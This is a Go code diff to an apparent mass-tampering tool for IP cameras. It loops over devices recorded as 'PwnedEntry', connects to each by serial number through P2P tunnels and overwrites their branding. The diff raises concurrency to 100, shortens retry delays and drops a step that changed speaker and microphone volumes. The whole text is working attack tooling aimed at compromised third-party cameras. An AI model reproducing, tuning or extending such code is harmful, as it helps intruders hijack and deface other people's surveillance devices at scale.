@@ -72,7 +72,7 @@ func Rebrand(outDir string, config *Config) {
 	fmt.Printf("[found] > %d cameras\n", len(entries))
 	fmt.Println()
 
-	retries := 5
+	retries := 3
 	if val, err := getIntValue(config.Scan.Retries); err == nil && val > retries {
 		retries = val
 	}
@@ -84,7 +84,7 @@ func Rebrand(outDir string, config *Config) {
 		failCount    int
 	)
 
-	sem := make(chan struct{}, 30)
+	sem := make(chan struct{}, 100)
 
 	for i, entry := range entries {
 		sem <- struct{}{}
@@ -100,11 +100,11 @@ func Rebrand(outDir string, config *Config) {
 
 			for attempt := 0; attempt < retries; attempt++ {
 				if attempt > 0 {
-					time.Sleep(time.Duration(attempt) * 1 * time.Second)
+					time.Sleep(200 * time.Millisecond)
 				}
 
 				client := p2p.NewDHClient(e.Serial, false)
-				client.SetRetries(3)
+				client.SetRetries(2)
 
 				if err := client.Handshake(); err != nil {
 					client.Close()
@@ -152,29 +152,16 @@ func Rebrand(outDir string, config *Config) {
 				currentEntry.Model = model
 				currentEntry.Channels = channels
 
-				// Apply branding
-				brandOK := true
-				if config.Brand.Enabled {
-					brandOK = applyBrandingToTunnel(tunnel, e.Serial, &currentEntry, config)
-				}
-
-				// Apply audio
-				audioOK := true
-				if config.Audio.Enabled {
-					audioOK = applyAudioToTunnel(tunnel, config)
-				}
+				// Apply branding only
+				brandOK := applyBrandingToTunnel(tunnel, e.Serial, &currentEntry, config)
 
 				mu.Lock()
-				if brandOK && audioOK {
+				if brandOK {
 					successCount++
 					fmt.Printf("\x1b[32m[%d/%d] OK\x1b[0m %s\n", current, len(entries), e.Serial)
-				} else if !brandOK && !audioOK {
-					// Both failed - likely not connected properly
-					failCount++
-					fmt.Printf("\x1b[91m[%d/%d] FAIL\x1b[0m %s (brand+audio failed)\n", current, len(entries), e.Serial)
 				} else {
-					successCount++
-					fmt.Printf("\x1b[33m[%d/%d] PARTIAL\x1b[0m %s (brand=%v audio=%v)\n", current, len(entries), e.Serial, brandOK, audioOK)
+					failCount++
+					fmt.Printf("\x1b[91m[%d/%d] FAIL\x1b[0m %s (brand failed)\n", current, len(entries), e.Serial)
 				}
 				mu.Unlock()
 
@@ -199,8 +186,8 @@ func Rebrand(outDir string, config *Config) {
 }
 
 func applyBrandingToTunnel(tunnel *p2p.PTCPTunnel, serial string, entry *PwnedEntry, config *Config) bool {
-	const maxRetries = 3
-	const retryDelay = 300 * time.Millisecond
+	const maxRetries = 2
+	const retryDelay = 100 * time.Millisecond
 
 	replacePlaceholders := func(tmpl string) string {
 		r := strings.ReplaceAll(tmpl, "{serial}", serial)
@@ -248,17 +235,4 @@ func applyBrandingToTunnel(tunnel *p2p.PTCPTunnel, serial string, entry *PwnedEn
 	}
 
 	return allOK
-}
-
-func applyAudioToTunnel(tunnel *p2p.PTCPTunnel, config *Config) bool {
-	const maxRetries = 3
-	const retryDelay = 300 * time.Millisecond
-
-	for attempt := 0; attempt < maxRetries; attempt++ {
-		if err := tunnel.SetAudioVolume(config.Audio.SpeakerVolume, config.Audio.MicVolume); err == nil {
-			return true
-		}
-		time.Sleep(retryDelay)
-	}
-	return false
 }
